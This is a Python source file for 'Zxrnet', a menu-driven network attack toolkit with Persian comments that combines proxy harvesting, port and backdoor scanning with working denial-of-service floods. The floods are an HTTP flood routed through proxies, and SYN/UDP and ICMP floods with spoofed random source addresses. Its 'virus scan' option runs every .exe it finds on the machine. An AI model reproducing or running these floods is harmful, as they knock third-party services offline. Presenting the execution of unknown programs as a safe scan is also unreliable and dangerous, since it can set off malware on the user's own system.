import requests
import threading
import queue
import random
import string
import socket
import time
import os
import json
import sys
import signal
import webbrowser
import subprocess
import psutil
from concurrent.futures import ThreadPoolExecutor
from termcolor import colored
from tqdm import tqdm
import logging
from datetime import datetime
import platform
from prettytable import PrettyTable

# تلاش برای وارد کردن scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, send, RandShort, RandIP
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print(colored("Scapy not available. Advanced Layer 3/4 attacks disabled.", "red"))

# تنظیمات لاگ
logging.basicConfig(filename='zxrnet.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# دیتابیس پورت‌ها و سرویس‌ها
SERVICE_PORTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
    3389: "RDP", 8080: "HTTP-Alt", 3306: "MySQL", 5432: "PostgreSQL"
}

# دیتابیس بک‌دورها
BACKDOOR_PORTS = {
    1234: "Netcat Backdoor", 2000: "Back Orifice", 31337: "Back Orifice 2000",
    4444: "Metasploit Default", 5555: "Android ADB Backdoor", 6666: "Common Trojan",
    7734: "GhostCtrl", 9999: "Generic Backdoor", 54321: "Generic Backdoor"
}

class Zxrnet:
    def __init__(self):
        """سازنده کلاس Zxrnet"""
        self.author = "@amirzxrtop"
        self.version = "4.1.0"
        self.proxies = []
        self.working_proxies = {"http": [], "socks4": [], "socks5": []}
        self.results_queue = queue.Queue()
        self.backdoor_queue = queue.Queue()
        self.virus_queue = queue.Queue()
        self.config_file = "zxrnet_config.json"
        self.exit_link = "https://t.me/Assasins_Official"
        self.proxy_sources = {
            "http": "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http",
            "socks4": "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4",
            "socks5": "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5"
        }
        self.load_config()
        self.clear_screen()
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, sig, frame):
        """مدیریت Ctrl+C"""
        print(colored("\nCtrl+C detected! Saving config and opening link...", "yellow"))
        self.save_config()
        self.open_exit_link()
        sys.exit(0)

    def clear_screen(self):
        """پاک کردن صفحه کنسول"""
        os.system('cls' if platform.system() == 'Windows' else 'clear')

    def load_config(self):
        """بارگذاری تنظیمات از فایل JSON"""
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    self.config = json.load(f)
                self.proxies = self.config.get("proxies", [])
                self.working_proxies = self.config.get("working_proxies", {"http": [], "socks4": [], "socks5": []})
                print(colored("Config loaded successfully.", "green"))
            else:
                self.config = {
                    "proxies": [],
                    "working_proxies": {"http": [], "socks4": [], "socks5": []},
                    "settings": {"threads": 50, "timeout": 5}
                }
                self.save_config()
                print(colored("New config file created.", "yellow"))
        except Exception as e:
            logging.error(f"Error loading config: {e}")
            print(colored(f"Error loading config: {e}", "red"))

    def save_config(self):
        """ذخیره تنظیمات در فایل JSON"""
        try:
            self.config["proxies"] = self.proxies
            self.config["working_proxies"] = self.working_proxies
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=4)
            print(colored("Config saved successfully.", "green"))
        except Exception as e:
            logging.error(f"Error saving config: {e}")
            print(colored(f"Error saving config: {e}", "red"))

    def banner(self):
        """نمایش بنر اصلی ابزار"""
        banner_text = f"""
        ===================================================
        In the name of God
        Zxrnet v{self.version} by {self.author}
        https://t.me/amirzxrtop
        ===================================================
        """
        print(colored(banner_text, "cyan"))

    def validate_ip(self, ip):
        """اعتبارسنجی آدرس IP"""
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False

    def validate_port(self, port):
        """اعتبارسنجی پورت"""
        try:
            port = int(port)
            if 1 <= port <= 65535:
                return True
            return False
        except ValueError:
            return False

    def validate_port_range(self, port_range_input):
        """اعتبارسنجی محدوده پورت‌ها"""
        try:
            start, end = map(int, port_range_input.split("-"))
            if 1 <= start <= 65535 and 1 <= end <= 65535 and start <= end:
                return (start, end)
            else:
                raise ValueError("Ports must be between 1 and 65535, and start <= end")
        except ValueError:
            print(colored("Invalid port range format. Use 'start-end' (e.g., 1-1000)", "red"))
            return None

    def generate_password_list(self, length=12, count=5000, custom_words=None):
        """تولید لیست رمزعبور قوی"""
        self.banner()
        print(colored(f"Generating {count} passwords of length {length}...", "yellow"))
        passwords = set()
        characters = string.ascii_letters + string.digits + string.punctuation
        custom_words = custom_words.split() if custom_words else []
        filename = f"passwords_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

        with tqdm(total=count, desc="Generating Passwords", colour="green") as pbar:
            while len(passwords) < count:
                if custom_words and random.random() > 0.5:
                    base = random.choice(custom_words)
                    pwd = base + ''.join(random.choice(characters) for _ in range(length - len(base)))
                else:
                    pwd = ''.join(random.choice(characters) for _ in range(length))
                passwords.add(pwd)
                pbar.update(1)

        try:
            with open(filename, 'w') as f:
                f.write("\n".join(passwords))
            print(colored(f"Password list saved to {filename}", "green"))
            self.generate_report(f"Generated {count} passwords and saved to {filename}")
        except Exception as e:
            logging.error(f"Error saving password list: {e}")
            print(colored(f"Error saving password list: {e}", "red"))

    def fetch_proxies(self, proxy_type="all"):
        """دریافت پروکسی‌ها از منابع آنلاین"""
        self.banner()
        print(colored(f"Fetching {proxy_type} proxies...", "yellow"))
        sources = self.proxy_sources if proxy_type == "all" else {proxy_type: self.proxy_sources[proxy_type]}
        total_collected = 0

        for ptype, url in sources.items():
            try:
                response = requests.get(url, timeout=self.config["settings"]["timeout"])
                if response.status_code == 200:
                    new_proxies = response.text.splitlines()
                    self.proxies.extend(new_proxies)
                    total_collected += len(new_proxies)
                    print(colored(f"Collected {len(new_proxies)} {ptype} proxies", "cyan"))
                    with open(f"{ptype}_proxies_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", "w") as f:
                        f.write("\n".join(new_proxies))
                    logging.info(f"Collected {len(new_proxies)} {ptype} proxies")
                else:
                    print(colored(f"Failed to fetch {ptype} proxies: HTTP {response.status_code}", "red"))
            except Exception as e:
                logging.error(f"Error fetching {ptype} proxies: {e}")
                print(colored(f"Error fetching {ptype} proxies: {e}", "red"))

        print(colored(f"Total proxies collected: {total_collected}", "green"))
        self.save_config()
        self.generate_report(f"Fetched {total_collected} proxies")

    def test_proxy(self, proxy, proxy_type):
        """تست یک پروکسی خاص"""
        proxy_dict = {proxy_type: f"{proxy_type}://{proxy}"}
        start_time = time.time()
        try:
            response = requests.get("http://www.google.com", proxies=proxy_dict, timeout=self.config["settings"]["timeout"])
            if response.status_code == 200:
                latency = (time.time() - start_time) * 1000
                return (proxy, latency)
            return None
        except Exception:
            return None

    def test_all_proxies(self, threads=50):
        """تست همه پروکسی‌های جمع‌آوری‌شده"""
        self.banner()
        if not self.proxies:
            print(colored("No proxies available to test. Please fetch proxies first.", "red"))
            return

        print(colored(f"Testing {len(self.proxies)} proxies with {threads} threads...", "yellow"))
        proxy_types = ["http", "socks4", "socks5"]
        tested_proxies = 0

        with tqdm(total=len(self.proxies), desc="Testing Proxies", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = []
                for proxy in self.proxies:
                    for ptype in proxy_types:
                        futures.append(executor.submit(self.test_proxy, proxy, ptype))
                        break

                for future in futures:
                    result = future.result()
                    if result:
                        proxy, latency = result
                        for ptype in proxy_types:
                            if proxy in [p[0] for p in self.working_proxies[ptype]]:
                                continue
                            self.working_proxies[ptype].append((proxy, latency))
                            break
                    tested_proxies += 1
                    pbar.update(1)

        table = PrettyTable(["Proxy", "Type", "Latency (ms)"])
        for ptype, proxies in self.working_proxies.items():
            for proxy, latency in proxies:
                table.add_row([proxy, ptype, f"{latency:.2f}"])
            print(colored(f"Found {len(proxies)} working {ptype} proxies", "green"))
            with open(f"working_{ptype}_proxies_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", "w") as f:
                f.write("\n".join([p[0] for p in proxies]))

        print(table)
        self.save_config()
        self.generate_report(f"Tested {tested_proxies} proxies. Found {sum(len(p) for p in self.working_proxies.values())} working proxies")

    def scan_port(self, target, port, protocol="tcp"):
        """اسکن یک پورت خاص"""
        try:
            if protocol == "tcp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            
            if result == 0:
                service = SERVICE_PORTS.get(port, "Unknown")
                banner = self.grab_banner(target, port, protocol)
                status = "open" if banner or service != "Unknown" else "closed"
                self.results_queue.put((port, protocol.upper(), status, service, banner or "No banner"))
            else:
                self.results_queue.put((port, protocol.upper(), "closed", "Unknown", "No response"))
            
            sock.close()
        except Exception as e:
            logging.error(f"Error scanning port {port} ({protocol}): {e}")
            self.results_queue.put((port, protocol.upper(), "error", "Unknown", str(e)))

    def grab_banner(self, target, port, protocol):
        """دریافت بنر از یک پورت"""
        try:
            if protocol == "tcp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target, port))
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                sock.close()
                return banner if banner else None
            elif protocol == "udp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
                sock.sendto(b"WHO", (target, port))
                banner, _ = sock.recvfrom(1024)
                sock.close()
                return banner.decode('utf-8', errors='ignore').strip() if banner else None
        except Exception:
            return None

    def scan_ports(self, target, port_range=(1, 1000), threads=100):
        """اسکن پورت‌ها در یک محدوده خاص"""
        self.banner()
        if not self.validate_ip(target):
            print(colored("Invalid IP address!", "red"))
            return
        
        print(colored(f"Scanning ports on {target} ({port_range[0]}-{port_range[1]}) with TCP and UDP...", "yellow"))
        table = PrettyTable(["Port", "Protocol", "Status", "Service", "Banner"])
        total_ports = (port_range[1] - port_range[0] + 1) * 2

        with tqdm(total=total_ports, desc="Scanning Ports", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for port in range(port_range[0], port_range[1] + 1):
                    executor.submit(self.scan_port, target, port, "tcp")
                    executor.submit(self.scan_port, target, port, "udp")
                    pbar.update(2)

        open_ports = 0
        while not self.results_queue.empty():
            port, protocol, status, service, banner = self.results_queue.get()
            if status == "open":
                table.add_row([port, protocol, colored(status, "green"), service, banner[:50] + "..." if banner and len(banner) > 50 else banner])
                open_ports += 1
            elif status == "error":
                print(colored(f"Error on port {port} ({protocol}): {banner}", "red"))

        if open_ports > 0:
            print(table)
        else:
            print(colored("No open ports with identifiable services found.", "yellow"))
        self.generate_report(f"Scanned ports on {target}. Found {open_ports} open ports")

    def scan_backdoor(self, target, port, protocol="tcp"):
        """اسکن پورت برای بک‌دور"""
        try:
            if protocol == "tcp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            
            if result == 0:
                banner = self.grab_banner(target, port, protocol)
                backdoor_name = BACKDOOR_PORTS.get(port, "Unknown Backdoor")
                self.backdoor_queue.put((port, protocol.upper(), "open", backdoor_name, banner or "No banner"))
            sock.close()
        except Exception as e:
            logging.error(f"Error scanning backdoor port {port} ({protocol}): {e}")

    def scan_backdoors(self, target, threads=50):
        """اسکن پورت‌ها برای بک‌دورهای شناخته‌شده"""
        self.banner()
        if not self.validate_ip(target):
            print(colored("Invalid IP address!", "red"))
            return
        
        print(colored(f"Scanning for known backdoors on {target}...", "yellow"))
        table = PrettyTable(["Port", "Protocol", "Status", "Backdoor Name", "Banner"])
        total_ports = len(BACKDOOR_PORTS) * 2

        with tqdm(total=total_ports, desc="Scanning Backdoors", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for port in BACKDOOR_PORTS.keys():
                    executor.submit(self.scan_backdoor, target, port, "tcp")
                    executor.submit(self.scan_backdoor, target, port, "udp")
                    pbar.update(2)

        open_backdoors = 0
        while not self.backdoor_queue.empty():
            port, protocol, status, backdoor_name, banner = self.backdoor_queue.get()
            if status == "open":
                table.add_row([port, protocol, colored(status, "green"), backdoor_name, banner[:50] + "..." if banner and len(banner) > 50 else banner])
                open_backdoors += 1

        if open_backdoors > 0:
            print(colored("WARNING: Potential backdoors detected!", "red"))
            print(table)
        else:
            print(colored("No known backdoors detected.", "green"))
        self.generate_report(f"Scanned for backdoors on {target}. Found {open_backdoors} potential backdoors")

    def scan_virus(self, file_path=None):
        """اسکن ویروس در فایل یا کل سیستم"""
        self.banner()
        if file_path:
            if not os.path.exists(file_path) or not file_path.lower().endswith(".exe"):
                print(colored("Error: File does not exist or is not an .exe!", "red"))
                return
            self.analyze_file(file_path)
        else:
            self.scan_system_for_exe()

    def scan_system_for_exe(self):
        """جمع‌آوری و اسکن تمام فایل‌های .exe در سیستم"""
        exe_files = []
        print(colored("Scanning system for .exe files...", "yellow"))
        
        drives = ['C:\\'] if platform.system() == "Windows" else ['/']
        for drive in drives:
            for root, _, files in os.walk(drive):
                for file in files:
                    if file.lower().endswith(".exe"):
                        exe_files.append(os.path.join(root, file))
        
        print(colored(f"Found {len(exe_files)} .exe files. Analyzing...", "yellow"))
        with tqdm(total=len(exe_files), desc="Analyzing Files", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=5) as executor:
                executor.map(self.analyze_file, exe_files)
                pbar.update(len(exe_files))

        self.display_virus_results()

    def analyze_file(self, file_path):
        """تحلیل رفتار فایل برای تشخیص ویروس"""
        try:
            process = subprocess.Popen([file_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
            start_time = time.time()
            suspicious = False
            behavior_score = 0

            while time.time() - start_time < 5:
                cpu_usage = psutil.Process(process.pid).cpu_percent(interval=0.1)
                if cpu_usage > 80:
                    behavior_score += 30
                connections = psutil.Process(process.pid).net_connections()
                if connections:
                    behavior_score += 50
                if os.path.exists(file_path + ".tmp"):
                    behavior_score += 40
                time.sleep(0.5)

            process.terminate()
            try:
                process.wait(timeout=2)
            except subprocess.TimeoutExpired:
                process.kill()

            if behavior_score > 50:
                suspicious = True
            
            self.virus_queue.put((file_path, suspicious, behavior_score))
        except Exception as e:
            logging.error(f"Error analyzing {file_path}: {e}")

    def display_virus_results(self):
        """نمایش نتایج اسکن ویروس"""
        table = PrettyTable(["File Path", "Suspicious", "Behavior Score"])
        suspicious_count = 0
        
        while not self.virus_queue.empty():
            file_path, suspicious, score = self.virus_queue.get()
            status = colored("Yes", "red") if suspicious else colored("No", "green")
            table.add_row([file_path, status, score])
            if suspicious:
                suspicious_count += 1
        
        if suspicious_count > 0:
            print(colored("WARNING: Potential viruses detected!", "red"))
            print(table)
        else:
            print(colored("No suspicious files detected.", "green"))
        self.generate_report(f"Scanned for viruses. Found {suspicious_count} suspicious files")

    def layer7_stress(self, target, duration=60, threads=200, use_proxies=True):
        """استرسر لایه 7 قوی"""
        self.banner()
        print(colored(f"Starting Layer 7 attack on {target} for {duration} seconds...", "red"))
        end_time = time.time() + duration
        requests_sent = 0

        def flood():
            nonlocal requests_sent
            headers = {
                "User-Agent": random.choice(["Mozilla/5.0", "Chrome/90.0", "Safari/537.36"]),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
            }
            while time.time() < end_time:
                try:
                    proxy = random.choice([p[0] for p in self.working_proxies["http"]]) if use_proxies and self.working_proxies["http"] else None
                    proxies = {"http": f"http://{proxy}"} if proxy else None
                    requests.get(target, headers=headers, proxies=proxies, timeout=5)
                    requests_sent += 1
                except Exception:
                    pass

        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(lambda _: flood(), range(threads))

        print(colored(f"Layer 7 attack completed. Sent {requests_sent} requests.", "green"))
        self.generate_report(f"Layer 7 attack on {target} for {duration}s. Sent {requests_sent} requests")

    def layer4_stress(self, target, port, duration=60, threads=200, protocol="tcp"):
        """استرسر لایه 4 قوی"""
        self.banner()
        if not self.validate_ip(target) or not self.validate_port(port):
            print(colored("Invalid IP or port!", "red"))
            return

        if not SCAPY_AVAILABLE:
            print(colored("Layer 4 attack requires scapy. Falling back to basic mode...", "yellow"))
            self.basic_layer4_stress(target, port, duration, threads, protocol)
            return

        print(colored(f"Starting Enhanced Layer 4 {protocol.upper()} attack on {target}:{port} for {duration} seconds...", "red"))
        end_time = time.time() + duration
        packets_sent = 0

        def flood():
            nonlocal packets_sent
            while time.time() < end_time:
                try:
                    if protocol == "tcp":
                        pkt = IP(dst=target, src=RandIP()) / TCP(dport=port, sport=RandShort(), flags="S")
                    else:
                        pkt = IP(dst=target, src=RandIP()) / UDP(dport=port, sport=RandShort())
                    send(pkt, verbose=False, count=50)
                    packets_sent += 50
                except Exception as e:
                    logging.error(f"Layer 4 flood error: {e}")

        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(lambda _: flood(), range(threads))

        print(colored(f"Enhanced Layer 4 {protocol.upper()} attack completed. Sent {packets_sent} packets.", "green"))
        self.generate_report(f"Enhanced Layer 4 {protocol} attack on {target}:{port} for {duration}s. Sent {packets_sent} packets")

    def basic_layer4_stress(self, target, port, duration, threads, protocol):
        """استرسر لایه 4 پایه"""
        end_time = time.time() + duration
        packets_sent = 0

        def flood():
            nonlocal packets_sent
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM if protocol == "tcp" else socket.SOCK_DGRAM)
            while time.time() < end_time:
                try:
                    sock.connect((target, port))
                    sock.send(b"FLOOD" * 100)
                    packets_sent += 1
                except:
                    pass
            sock.close()

        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(lambda _: flood(), range(threads))

        print(colored(f"Basic Layer 4 {protocol.upper()} attack completed. Sent {packets_sent} packets.", "green"))
        self.generate_report(f"Basic Layer 4 {protocol} attack on {target}:{port} for {duration}s. Sent {packets_sent} packets")

    def layer3_stress(self, target, duration=60, threads=200):
        """استرسر لایه 3 قوی"""
        self.banner()
        if not self.validate_ip(target):
            print(colored("Invalid IP address!", "red"))
            return

        if not SCAPY_AVAILABLE:
            print(colored("Layer 3 attack requires scapy. Falling back to basic mode...", "yellow"))
            self.basic_layer3_stress(target, duration, threads)
            return

        print(colored(f"Starting Enhanced Layer 3 attack on {target} for {duration} seconds...", "red"))
        end_time = time.time() + duration
        packets_sent = 0

        def flood():
            nonlocal packets_sent
            while time.time() < end_time:
                try:
                    pkt = IP(dst=target, src=RandIP()) / ICMP() / (b"X" * random.randint(100, 1000))
                    send(pkt, verbose=False, count=30)
                    packets_sent += 30
                except Exception as e:
                    logging.error(f"Layer 3 flood error: {e}")

        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(lambda _: flood(), range(threads))

        print(colored(f"Enhanced Layer 3 attack completed. Sent {packets_sent} packets.", "green"))
        self.generate_report(f"Enhanced Layer 3 attack on {target} for {duration}s. Sent {packets_sent} packets")

    def basic_layer3_stress(self, target, duration, threads):
        """استرسر لایه 3 پایه"""
        end_time = time.time() + duration
        packets_sent = 0

        def flood():
            nonlocal packets_sent
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                while time.time() < end_time:
                    sock.sendto(b"PING" * 100, (target, 0))
                    packets_sent += 1
                sock.close()
            except Exception as e:
                logging.error(f"Basic Layer 3 flood error: {e}")

        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(lambda _: flood(), range(threads))

        print(colored(f"Basic Layer 3 attack completed. Sent {packets_sent} packets.", "green"))
        self.generate_report(f"Basic Layer 3 attack on {target} for {duration}s. Sent {packets_sent} packets")

    def generate_report(self, message):
        """تولید گزارش و ذخیره در فایل"""
        try:
            with open("zxrnet_report.txt", "a") as f:
                f.write(f"[{datetime.now()}] {message}\n")
            logging.info(message)
        except Exception as e:
            print(colored(f"Error writing report: {e}", "red"))

    def open_exit_link(self):
        """باز کردن لینک خروج در مرورگر یا تلگرام"""
        try:
            # ابتدا تلاش برای باز کردن با webbrowser
            webbrowser.open(self.exit_link)
        except Exception:
            # در صورت شکست، تلاش برای باز کردن با دستور سیستم
            if platform.system() == "Windows":
                os.system(f"start {self.exit_link}")
            elif platform.system() == "Linux":
                os.system(f"xdg-open {self.exit_link} || termux-open-url {self.exit_link}")
            else:  # ترموکس یا سایر سیستم‌ها
                os.system(f"termux-open-url {self.exit_link} || xdg-open {self.exit_link}")
        print(colored("Opening exit link...", "green"))

    def display_menu(self):
        """نمایش منوی اصلی"""
        self.banner()
        options = [
            "1. Generate Password List",
            "2. Fetch Proxies",
            "3. Test Proxies",
            "4. Scan Ports",
            "5. Scan Backdoors",
            "6. Scan Virus",
            "7. Layer 7 Stress",
            "8. Layer 4 Stress",
            "9. Layer 3 Stress",
            "10. Exit"
        ]
        print("\n".join(colored(opt, "cyan") for opt in options))

    def get_user_input(self, prompt, default=None):
        """دریافت ورودی از کاربر با مقدار پیش‌فرض"""
        value = input(colored(f"{prompt} [{'default' if default else 'required'}]: ", "yellow"))
        return value if value else default

    def run(self):
        """اجرای حلقه اصلی ابزار"""
        while True:
            self.display_menu()
            choice = self.get_user_input("Select an option", None)

            try:
                if choice == "1":
                    length = int(self.get_user_input("Password length (e.g., 12)", "12"))
                    count = int(self.get_user_input("Number of passwords (e.g., 5000)", "5000"))
                    custom_words = self.get_user_input("Custom words (optional, space-separated)", None)
                    self.generate_password_list(length, count, custom_words)

                elif choice == "2":
                    proxy_type = self.get_user_input("Proxy type (http/socks4/socks5/all)", "all")
                    if proxy_type not in ["http", "socks4", "socks5", "all"]:
                        print(colored("Invalid proxy type!", "red"))
                        continue
                    self.fetch_proxies(proxy_type)

                elif choice == "3":
                    threads = int(self.get_user_input(f"Number of threads (default {self.config['settings']['threads']})", str(self.config["settings"]["threads"])) or self.config["settings"]["threads"])
                    self.test_all_proxies(threads)

                elif choice == "4":
                    while True:
                        target = self.get_user_input("Target IP (e.g., 192.168.1.1)", None)
                        if self.validate_ip(target):
                            break
                        print(colored("Invalid IP address! Please try again.", "red"))

                    while True:
                        port_range_input = self.get_user_input("Port range (start-end, e.g., 1-1000)", "1-1000")
                        port_range = self.validate_port_range(port_range_input)
                        if port_range:
                            break

                    threads = int(self.get_user_input(f"Number of threads (default {self.config['settings']['threads']})", str(self.config["settings"]["threads"])) or self.config["settings"]["threads"])
                    self.scan_ports(target, port_range, threads)

                elif choice == "5":
                    while True:
                        target = self.get_user_input("Target IP (e.g., 192.168.1.1)", None)
                        if self.validate_ip(target):
                            break
                        print(colored("Invalid IP address! Please try again.", "red"))
                    threads = int(self.get_user_input(f"Number of threads (default {self.config['settings']['threads']})", str(self.config["settings"]["threads"])) or self.config["settings"]["threads"])
                    self.scan_backdoors(target, threads)

                elif choice == "6":
                    choice = self.get_user_input("Scan a single file (1) or entire system (2)", None)
                    if choice == "1":
                        file_path = self.get_user_input("Enter the full path to the .exe file (e.g., C:\\test.exe)", None)
                        self.scan_virus(file_path)
                    elif choice == "2":
                        self.scan_virus()
                    else:
                        print(colored("Invalid choice!", "red"))

                elif choice == "7":
                    target = self.get_user_input("Target URL (e.g., http://example.com)", None)
                    duration = int(self.get_user_input("Duration (seconds, e.g., 60)", "60"))
                    threads = int(self.get_user_input("Number of threads (default 200)", "200"))
                    use_proxies = self.get_user_input("Use proxies? (y/n, default y)", "y").lower() in ["", "y"]
                    self.layer7_stress(target, duration, threads, use_proxies)

                elif choice == "8":
                    while True:
                        target = self.get_user_input("Target IP (e.g., 192.168.1.1)", None)
                        if self.validate_ip(target):
                            break
                        print(colored("Invalid IP address! Please try again.", "red"))

                    port = int(self.get_user_input("Target Port (1-65535)", None))
                    if not self.validate_port(port):
                        print(colored("Invalid port!", "red"))
                        continue

                    protocol = self.get_user_input("Protocol (tcp/udp)", "tcp").lower()
                    if protocol not in ["tcp", "udp"]:
                        print(colored("Invalid protocol!", "red"))
                        continue

                    duration = int(self.get_user_input("Duration (seconds, e.g., 60)", "60"))
                    threads = int(self.get_user_input("Number of threads (default 200)", "200"))
                    self.layer4_stress(target, port, duration, threads, protocol)

                elif choice == "9":
                    while True:
                        target = self.get_user_input("Target IP (e.g., 192.168.1.1)", None)
                        if self.validate_ip(target):
                            break
                        print(colored("Invalid IP address! Please try again.", "red"))

                    duration = int(self.get_user_input("Duration (seconds, e.g., 60)", "60"))
                    threads = int(self.get_user_input("Number of threads (default 200)", "200"))
                    self.layer3_stress(target, duration, threads)

                elif choice == "10":
                    print(colored("Exiting Zxrnet. Saving config and opening link...", "green"))
                    self.save_config()
                    self.open_exit_link()
                    sys.exit(0)

                else:
                    print(colored("Invalid option! Please try again.", "red"))

            except ValueError as e:
                print(colored(f"Input error: {e}", "red"))
            except Exception as e:
                logging.error(f"Unexpected error in option {choice}: {e}")
                print(colored(f"Unexpected error: {e}", "red"))

            input(colored("Press Enter to continue...", "yellow"))
            self.clear_screen()

if __name__ == "__main__":
    print(colored("Starting Zxrnet...", "green"))
    tool = Zxrnet()
    tool.run()